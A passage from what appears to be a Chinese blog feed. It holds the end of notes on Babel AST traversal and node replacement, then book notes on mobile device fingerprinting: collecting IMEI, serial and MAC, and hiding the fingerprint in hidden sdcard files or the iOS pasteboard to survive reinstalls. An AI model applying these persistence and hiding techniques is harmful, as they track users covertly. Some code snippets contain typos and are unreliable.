class="params">path</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//最常用</span></span><br><span class="line"><span class="keyword">const</span> visitor2=&#123;</span><br><span class="line">    <span class="title class_">FunctionExpression</span>(path)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> visitor3=&#123;</span><br><span class="line">    <span class="title class_">FunctionExpression</span>:&#123;</span><br><span class="line">        <span class="title function_">enter</span>(<span class="params">path</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在visitor3中存在一个enter，表示进入节点时，还有一个exit 表示退出节点时，这两个时机可以访问节点</span></span><br></pre></td></tr></table></figure><p>还可以把方法名使用<code>&#39;|&#39;</code>连接，如<code>FunctionExpression|BinaryExpression</code>形式字符串,把一个方法应用对个节点中。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> visitor2=&#123;</span><br><span class="line">    <span class="string">&quot;FunctionExpression | BinaryExpression &quot;</span>(path)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>也可以把多个函数应用一个节点中，如原先是把一个函数赋值给enter或者exit，现在改为函数的数组，会按照顺序依次进行。如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">func1</span>(<span class="params">path</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;func1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func2</span>(<span class="params">path</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;func2&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> visitor3=&#123;</span><br><span class="line">    <span class="title class_">FunctionExpression</span>:&#123;</span><br><span class="line">        <span class="attr">enter</span>:[func1,func2]          </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>traverse并非必须从遍历，它可从任意节点向下遍历，例如想要把代码中所有函数的第一个参数改为x</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> updateParamNameVisitor=&#123;</span><br><span class="line">    <span class="title class_">Identifier</span>(path)&#123;</span><br><span class="line">        <span class="keyword">if</span>(path.<span class="property">node</span>.<span class="property">name</span> === <span class="variable language_">this</span>.<span class="property">paramName</span>)&#123;</span><br><span class="line">            path.<span class="property">node</span>.<span class="property">name</span>=<span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> visitor=&#123;</span><br><span class="line">    <span class="title class_">FunctionExpression</span>(path)&#123;</span><br><span class="line">        <span class="keyword">const</span> paramName=path.<span class="property">node</span>.<span class="property">params</span>[<span class="number">0</span>].<span class="property">name</span>;<span class="comment">//取出函数第一个参数名</span></span><br><span class="line">        path.<span class="title function_">traverse</span>(updateParamNameVisitor,&#123;</span><br><span class="line">            paramName</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">traverse</span>(ast,visitor)；</span><br></pre></td></tr></table></figure><p>解析：先用traverse根据visitor去遍历所有节点，当遍历到 FunctionExpression节点，用path.traverse根据updateParamNameVisitor去遍历当前节点下所有子节点，然后修改与函数第一个参数相同的标识符，在使用 path.traverse还可以传入一个对象，在对应的visitor中用this引用它</p><h3 id="type组件"><a href="#type组件" class="headerlink" title="type组件"></a>type组件</h3><p>该组件主要用来判断节点的类型，生成新的节点等。</p><p>t.isIdentifier(path.node)，等同于path.node.type === “Identifier”,还可以再判断类型的同时附加条件，如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">    <span class="title function_">enter</span>(<span class="params">path</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(path.<span class="property">node</span>.<span class="property">type</span> === <span class="string">&quot;Identifier&quot;</span> &amp;&amp; path.<span class="property">node</span>.<span class="property">name</span>===<span class="string">&quot;n&quot;</span>)&#123;</span><br><span class="line">path.<span class="property">node</span>.<span class="property">name</span>=<span class="string">&quot;x&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//等同于</span></span><br><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">    <span class="title function_">enter</span>(<span class="params">path</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(t.<span class="title function_">isIdentifier</span>(path.<span class="property">node</span>，&#123;<span class="attr">name</span>:<span class="string">&#x27;n&#x27;</span>&#125;))&#123;</span><br><span class="line">path.<span class="property">node</span>.<span class="property">name</span>=<span class="string">&quot;x&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>如果要判断其他类型，只需要改is后面的类型。</p><p>当节点不符合要求，抛出错误</p><p><code>`t.assertBinaryExpression(node对象)` 是一种断言工具，用于检查传入的节点是否是 二元表达式（BinaryExpression）。</code></p><p><code>t.assertBinaryExpression(maybeBinaryExpressionNode,&#123;operator:&quot;*&quot;&#125;); 判断是否是二项式并且操作符是*</code></p><h2 id="Path对象详解"><a href="#Path对象详解" class="headerlink" title="Path对象详解"></a>Path对象详解</h2><h3 id="Path与Node区别"><a href="#Path与Node区别" class="headerlink" title="Path与Node区别"></a>Path与Node区别</h3><p><code>path.stop</code>：停止遍历节点 与Babel中的<code>path.skip</code>类似</p><p>path.node能取出某类型的node对象，节点是Path的一部分，Path是一个对象，用来描述两个节点之间的连接</p><h3 id="Path中的方法"><a href="#Path中的方法" class="headerlink" title="Path中的方法"></a>Path中的方法</h3><h4 id="获取子节点-path"><a href="#获取子节点-path" class="headerlink" title="获取子节点/path"></a>获取子节点/path</h4><p>为了得到ast节点的属性值，一般先访问到该节点，然后利用path.node.property获取属性(property代指某个属性名)，如path.node.right，path.node.left，path.node.operator，通过这个方法获得的是Node或者具体属性值。</p><p>Node不能使用Path的方法，如果要获得该属性的Path，使用path.get(“属性名 字符串形式”)</p><p>任何形式属性值，通过path.get去获取，都会包装为Path对象再返回，像name,operator这一类就没必要包装</p><h4 id="判断Path类型"><a href="#判断Path类型" class="headerlink" title="判断Path类型"></a>判断Path类型</h4><p><img src="2025-01-15-AST混淆与反混淆/image-20241115203344621.png" alt="image-20241115203344621"></p><h4 id="节点转代码"><a href="#节点转代码" class="headerlink" title="节点转代码"></a>节点转代码</h4><p>generator组件可以把ast代码中的一部分节点转为代码，这对节点遍历过程中的调试有帮助</p><h4 id="替换节点属性"><a href="#替换节点属性" class="headerlink" title="替换节点属性"></a>替换节点属性</h4><p>替换节点属性与获取节点属性方法相同，只是改为赋值，但也不是随意替换，需注意，替换的类型要在允许的类型范围内</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> visitor3=&#123;</span><br><span class="line">    <span class="title class_">BinaryExpression</span>:&#123;</span><br><span class="line">        <span class="title function_">enter</span>(<span class="params">path</span>)&#123;</span><br><span class="line">            path.<span class="property">node</span>,left=t.<span class="title function_">identifier</span>(<span class="string">&quot;x&quot;</span>)</span><br><span class="line">            path.<span class="property">node</span>,right=t.<span class="title function_">identifier</span>(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">&#125;     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="替换整个节点"><a href="#替换整个节点" class="headerlink" title="替换整个节点"></a>替换整个节点</h4><p>Path中与替换相关的方法：replaceWith,replaceWithMultiple,replaceInline,replaceWithSourceString</p><p>replaceWith,是用一个节点替换另一个节点，严格一换一</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> visitor=&#123;</span><br><span class="line">    <span class="title class_">BinaryExpression</span>(path)&#123;</span><br><span class="line">        path.<span class="title function_">replaceWith</span>(t.<span class="title function_">valueToNode</span>(<span class="string">&quot;xxxx&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">traverse</span>(ast,visitor);</span><br></pre></td></tr></table></figure><p>replaceWithMultiple也是节点换节点，不过是多换一</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> visitor=&#123;</span><br><span class="line">    <span class="title class_">ReturnStatement</span>(path)&#123;</span><br><span class="line">        path.<span class="title function_">replaceWithMultiple</span>([</span><br><span class="line">            t.<span class="title function_">expressionStatement</span>(t.<span class="title function_">stringLiteral</span>(<span class="string">&quot;xxx&quot;</span>)),</span><br><span class="line">            t.<span class="title function_">expressionStatement</span>(t.<span class="title function_">numericLiteral</span>(<span class="number">1000</span>)),</span><br><span class="line">            t.<span class="title function_">returnStatement</span>(),</span><br><span class="line">        ]);</span><br><span class="line">       path.<span class="title function_">stop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">traverse</span>(ast,visitor);</span><br></pre></td></tr></table></figure><p>代码解析：当表达式语句单独在一行(没有赋值)，最好用expressionStatement包裹，替换后的节点，traverse也能遍历到。</p><p>replaceInline接收一个参数，如果参数不是数组，那么replaceInline等同于replaceWith；如果是数组，则等同于replaceWithMultiple，其中的数组成员必须是节点</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> visitor=&#123;</span><br><span class="line">    <span class="title class_">StringLiteral</span>(path)&#123;</span><br><span class="line">        path.<span class="title function_">replaceInline</span>(</span><br><span class="line">        t.<span class="title function_">stringLiteral</span>(<span class="string">&quot;1111&quot;</span>));</span><br><span class="line">        path.<span class="title function_">stop</span>();</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title class_">ReturnStatement</span>(path)&#123;</span><br><span class="line">        path.<span class="title function_">replaceInline</span>([</span><br><span class="line">            t.<span class="title function_">expressionStatement</span>(t.<span class="title function_">stringLiteral</span>(<span class="string">&quot;xxx&quot;</span>)),</span><br><span class="line">            t.<span class="title function_">expressionStatement</span>(t.<span class="title function_">numericLiteral</span>(<span class="number">1000</span>)),</span><br><span class="line">            t.<span class="title function_">returnStatement</span>(),</span><br><span class="line">        ]);</span><br><span class="line">       path.<span class="title function_">stop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">traverse</span>(ast,visitor);</span><br></pre></td></tr></table></figure><p>replaceWithSourceString()：用字符串源码替换节点，如把原始代码中的函数改为闭包形式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">    <span class="title class_">RertuenStatement</span>(path)&#123;</span><br><span class="line">        <span class="keyword">let</span> argumentPath=path.<span class="title function_">get</span>(<span class="string">&#x27;argument&#x27;</span>);</span><br><span class="line">        argumentPath.<span class="title function_">replaceWithSourceString</span>(</span><br><span class="line">            <span class="string">&#x27;function()&#123;return&#x27;</span>+argumentPath+<span class="string">&#x27;&#125;()&#x27;</span></span><br><span class="line">        );</span><br><span class="line">        path.<span class="title function_">stop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="删除节点"><a href="#删除节点" class="headerlink" title="删除节点"></a>删除节点</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">    <span class="title class_">EmptyStatement</span>(path)&#123;</span><br><span class="line">        path.<span class="title function_">remove</span>(); <span class="comment">//删除当前节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>EmptyStatement指的是空语句，就是多余的分号。</p><h4 id="插入节点"><a href="#插入节点" class="headerlink" title="插入节点"></a>插入节点</h4><p>想要把节点插入到兄弟节点中，可以使用insertBefore和insertAfter分别在当前节点前后插入结点</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">   <span class="title class_">ReturnStatement</span>(path)&#123;</span><br><span class="line">        path.<span class="title function_">insertBefore</span>(t.<span class="title function_">expressionStatement</span>(t.<span class="title function_">stringLiteral</span>(<span class="string">&quot;before&quot;</span>))); </span><br><span class="line">       path.<span class="title function_">insertAfter</span>(t.<span class="title function_">expressionStatement</span>(t.<span class="title function_">stringLiteral</span>(<span class="string">&quot;after&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="父级Path"><a href="#父级Path" class="headerlink" title="父级Path"></a>父级Path</h3><p>Path对象中有parentPath和parent两个属性，其中parentPath类型为NodePath，他是父级Path，parent类型为Node，他是父节点。</p><p>父级Path获取：path.parentPath，path.parentPath.node等同于path.parent。</p><h4 id="path-findParent"><a href="#path-findParent" class="headerlink" title="path.findParent"></a>path.findParent</h4><p>个别情况下，需要从一个路径向上遍历语法树，直到满足相应的条件，这时可以使用findParent。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">   <span class="title class_">ReturnStatement</span>(path)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(path.<span class="title function_">findParent</span>(<span class="function">(<span class="params">p</span>)=&gt;</span>p.<span class="title function_">isObjectExpression</span>()));</span><br><span class="line">       <span class="comment">//path.findParent(function(p)&#123;return p.isObjectExpression()&#125;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历returnstatement，然后向上找父级Path，当找到path对象类型为ObjectExpression,返回该path对象</span></span><br></pre></td></tr></table></figure><p>Path对象的findParent接收一个回调函数，在向上遍历每一个父级path时，会调用这个函数，并传入对应父级path对象作为参数，当该回调函数返回真值时，则将对应的父级path对象返回，</p><h4 id="path-find"><a href="#path-find" class="headerlink" title="path.find"></a>path.find</h4><p>使用与findParent一致，只不过find查找范围包括当前节点，</p><h4 id="path-getFunctionParent"><a href="#path-getFunctionParent" class="headerlink" title="path.getFunctionParent"></a>path.getFunctionParent</h4><p>向上查找与当前节点最接近的父函数，返回的也是path对象</p><h4 id="path-getStatementParent"><a href="#path-getStatementParent" class="headerlink" title="path.getStatementParent"></a>path.getStatementParent</h4><p>向上遍历语法树直到找到语句父节点，例如，声明语句，return语句，if语句，which语句和while语句，返回的也是path对象，该方法从当前节点找，如果想要找到return语句父语句，从parentPath中调用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">   <span class="title class_">ReturnStatement</span>(path)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(path.<span class="property">parentPath</span>.<span class="property">getStatementParent</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="父级path其他方法"><a href="#父级path其他方法" class="headerlink" title="父级path其他方法"></a>父级path其他方法</h4><p>与之前介绍类似，如替换父节点path.parentPath.replaceWith(Node)</p><p>和删除父节点(path.parentPath.remove)</p>]]></content>
      
      
      <categories>
          
          <category> 阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AST </tag>
            
            <tag> JS逆向 </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> 阅读 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《App安全实战指南》阅读笔记</title>
      <link href="/posts/cf804d4e.html"/>
      <url>/posts/cf804d4e.html</url>
      
        <content type="html"><![CDATA[<h1 id="《App安全实战指南》笔记录"><a href="#《App安全实战指南》笔记录" class="headerlink" title="《App安全实战指南》笔记录"></a>《App安全实战指南》笔记录</h1><h2 id="设备指纹"><a href="#设备指纹" class="headerlink" title="设备指纹"></a>设备指纹</h2><ul><li>设备指纹是指可以用于唯一识别出该设备的设备特征或者标识。设备指纹作为对端设备风险识别的重要因素，也逐步从简单的设备ID发展为结合设备ID，风险环境检测及设备行为分析等多个维度的信息来识别当前设备ID的真实性。<br>设备指纹由设备固有的，难以篡改的，唯一的设备参数生成。<br>设备指纹通常使用设备的IMEI，设备序列号，MAC地址，广告追踪标识等设备硬软件信息，结合服务端算法计算设备唯一ID，保证在用户重装应用，升级系统等情况下依旧有唯一性。</li></ul><h3 id="设备指纹系统"><a href="#设备指纹系统" class="headerlink" title="设备指纹系统"></a>设备指纹系统</h3><p>设备指纹并不仅要在客户端采集设备数据后生成一条设备标识字符串，还需要依靠一整套的设备指纹系统保证其唯一性和稳定性。</p><p>设备指纹系统分为两个模块：客户端和服务费。</p><p><strong>客户端</strong>负责采集设备的特征属性，将采集的原始设备数据隐藏到设备本地一份，同时上传到服务端一份。<strong>服务端</strong>接收客户端上传的原始设备数据，使用设备参数查询设备库。如果设备指纹库中已经有该设备的设备指纹则直接将其下发到客户端，如果设备库中未查询到该设备指纹，则通过设备指纹算法生成唯一标识设备的设备指纹，并将其下发客户端。</p><h3 id="设备数据采集"><a href="#设备数据采集" class="headerlink" title="设备数据采集"></a>设备数据采集</h3><p>稳定性和唯一性是设备指纹所必须的特性，因此生成设备指纹所选择的设备参数也需要有这两个特性。</p><p>android设备</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">字段名称              字段含义                 特性</span><br><span class="line">imei/meid            国际移动设备识别码        相同厂商同型号设备存在小概率发生号码碰撞</span><br><span class="line">model                设备型号                 同厂商同型号设备，该参数相同</span><br><span class="line">screen               屏幕真实分辨率            同厂商同型号设备，该参数相同</span><br><span class="line"><span class="keyword">memory</span>               手机内存大小              同厂商同型号设备，该参数相同</span><br><span class="line">serialno             设备序列号                从android11开始，需申请相应权限，同型号设备存在                                              小概率发生号码碰撞</span><br><span class="line">drmuid               数字版权相关串号          不需要申请相应权限，高版本系统存在同一个设备中每个                                             应用获取的值不相同的情况</span><br><span class="line">oaid                 移动联盟设备唯一标识       仅能获取加入移动联盟厂商的设备的oaid</span><br><span class="line">cid                  SD卡序列号               不需要申请相应权限，存在获取失败的情况</span><br><span class="line">android_id           设备的唯一识别码          不需要申请相应权限,相同厂商同型号设备存在小概率发                                              生号码碰撞</span><br><span class="line"><span class="keyword">mac</span>                  设备网卡的<span class="keyword">MAC</span>地址         需要申请相应权限，高版本系统可能随机返回虚假<span class="keyword">MAC</span>地                                              址</span><br></pre></td></tr></table></figure><p>获取设备序列号serialno时不直接调用系统的接口，而采用反射的方式，能解决系统不提供调用接口的问题。</p><ul><li><p>如果当前版本大于7.0，直接</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">StringBuild <span class="type">serial</span> - <span class="built_in">new</span> StringBuild();</span><br><span class="line"><span class="type">serial</span>.append(Build.SERIAL);</span><br></pre></td></tr></table></figure><p>否则进行反射</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span>&lt;?&gt; c=<span class="keyword">Class</span>.forName(&quot;android.os.SystemProperties&quot;);</span><br><span class="line"><span class="keyword">Method</span> <span class="keyword">get</span> =c.getMethod(&quot;get&quot;,String.<span class="keyword">class</span>);</span><br><span class="line"><span class="type">serial</span>.append((String)<span class="keyword">get</span>.invoke(c,&quot;ro.serialno&quot;));</span><br></pre></td></tr></table></figure></li><li><p>方法二：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FILE</span> <span class="comment">*fp;</span></span><br><span class="line"><span class="comment">*serialno = (char *)calloc(128,sizeof(char));</span></span><br><span class="line">fp=p<span class="meta">open</span>(<span class="string">&quot;cat /sys/devices/soc0/serial_number&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">fgets(<span class="comment">*serialno,128,fp);</span></span><br><span class="line">p<span class="meta">close</span>(fp);</span><br></pre></td></tr></table></figure></li></ul><p>获取drmuid，cid，mac见书160</p><p>客户端采集的设备数据直接决定了生成的设备指纹是否稳定和唯一有效，所以必须保证数据上报到服务器过程的安全性，为防止中间人攻击或者数据被替换，需要使用一整套加密和逻辑校验保证数据传输的安全。</p><p><strong>客户端</strong></p><ol><li>使用AES将采集的设备数据进行整体加密</li><li>结合当前用户的SESSIONID计算一个签名</li><li>将加密后设备数据和计算出的校验值进行拼接(可以用 . 分隔)，整体BASE64上传至服务端</li></ol><p><strong>服务端</strong></p><ol><li>对数据进行解析拆分，取出加密后的设备数据和客户端计算的签名</li><li>利用当前用户查询服务端存储的SESSIONID，使用和客户端一样的签名算法对加密数据进行签名</li><li>对比服务端和客户端的计算签名是否一致，一致则正常对上报的数据进行解密，否则丢弃</li></ol><h3 id="设备指纹生成"><a href="#设备指纹生成" class="headerlink" title="设备指纹生成"></a>设备指纹生成</h3><p>为了保证设备指纹的稳定性，每次使用固定算法生成设备指纹时相关字段拼接顺序要保持一致，不能随机更换。如果生成设备指纹需要的设备参数获取失败或者获取的为无效值，则用空字符串替换该值，我们将新生成的设备指纹命名为SUID。</p><p>为了在服务端保证设备指纹的稳定性，要将新生成的设备指纹和生成设备指纹所用的核心设备特征逐个建立映射关系，形成多维度的映射关系存储矩阵。这样才保证在部分设备特征变动后设备指纹的稳定性和唯一性。</p><p>数据库存储矩阵的主要目的是在客户端存储的设备指纹失效或者丢失后，能够根据重新上报的设备数据查询到服务端存储的原始设备指纹，从而保证设备指纹的稳定性。</p><h3 id="设备指纹隐藏"><a href="#设备指纹隐藏" class="headerlink" title="设备指纹隐藏"></a>设备指纹隐藏</h3><p>设备指纹能够保证稳定性和唯一性，除了依赖服务端外，还依赖设备指纹在客户端的存储逻辑。客户端每次使用设备指纹时会首先读取本地存储的设备指纹，只有本地读取失败，才会重新请求服务端获取设备指纹，防止高频率请求给服务端带来压力。</p><p>对于设备指纹存储在客户端的安全存储问题：</p><ul><li>客户端接收到服务端下发的设备指纹后对其进行加密处理，同时获取当前的时间戳结合加密后的设备指纹生成用于防篡改的签名。将加密后的设备指纹，防篡改签名和生成签名使用的时间戳整体base64，最后将处理后的设备指纹隐藏当前设备。</li></ul><p>Android<strong>的隐藏路径</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/sdcard/Android/.backup/.config             沙箱根目录创建隐藏文件</span><br><span class="line">/sdcard/DCIM/.config                        相册所在目录创建隐藏文件</span><br><span class="line">/sdcard/.tconfig                            sdcard根目录创建隐藏文件</span><br><span class="line">/sdcard/.SystemConfig/.backup/.config       sdcard根目录创建隐藏文件</span><br><span class="line">/sdcard/Android/data/包名/.backup/.config    应用沙箱目录创建隐藏文件</span><br></pre></td></tr></table></figure><p><strong>IOS隐藏路径</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Preferenecs文件 </span>          应用的<span class="keyword">Preference属性设置文件</span></span><br><span class="line"><span class="keyword"></span>KeyChain                 钥匙串，苹果公司的密码管理系统</span><br><span class="line">Pasteboard               将要保护的数据隐藏在剪贴板</span><br></pre></td></tr></table></figure><h3 id="设备指纹应用"><a href="#设备指纹应用" class="headerlink" title="设备指纹应用"></a>设备指纹应用</h3><p><strong>客户端</strong></p><p>当客户端使用设备指纹时，首先尝试通过客户端模块获取隐藏在程序目录或设备中的设备指纹，当设备中不存在隐藏的设备指纹或者隐藏设备指纹为无效值时，尝试通过服务端获取设备指纹</p><p>设备指纹系统中的客户端部分用于保证服务端将设备指纹下发到客户端后的稳定性，同时保证生成设备指纹所用特征值的稳定性，客户端每次使用设备指纹时首先要获取在设备本地隐藏的设备指纹，当设备本地没有设备指纹或者设备指纹无效时，就需要请求服务端获取新的设备指纹。服务端存储了设备指纹和设备特征值映射关系，通过设备特征值查询到当前设备的设备指纹，当服务端查询不到当前设备特征值对应的设备指纹时，就使用上报的设备特征值重新生成新的设备指纹，这就需要保证设备特征值不会随意变化，每次获取设备特征值时都要首先读取设备中隐藏的特征值，只有无法读取到隐藏的特征值时才会重新获取。</p><p><strong>服务端</strong></p><p>服务端主要作用就是生成设备指纹和保证设备指纹的稳定性，当服务端生成新的设备指纹时，除了需要存储设备指纹，同时存储它和设备特征映射关系。存储的映射关系中每条记录都会有3个基准设备特征值(screen，model,memory)和核心设备特征值。Android的核心特征值imei,serialno,drmuid,cid,android_idmac，ios设备核心特征值idfv,idfa,uuid</p><p>服务端查询结果数量和核心特征数量对应，设备指纹稳定性就是依赖这些查询结果实现的，规则如下：</p><ul><li>如果所有查询结果中匹配的核心特征数量不同，则以匹配数量最多的查询结果为准，取其对应设备指纹</li><li>如果所有查询结果中匹配的核心特征数量相同，则按核心特征值权重等级进行筛选</li><li>如果所有查询结果中都没匹配到核心特征，则认为是一个新设备，用特征值生成设备指纹。</li></ul><p>Android设备核心特征值权重等级：android_id&gt;serialno&gt;drmuid&gt;mac&gt;sdcard</p><p>IOS设备核心特征值权重等级:idfa&gt;idfv&gt;uuid</p>]]></content>
      
      
      <categories>
          
          <category> 阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阅读 </tag>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
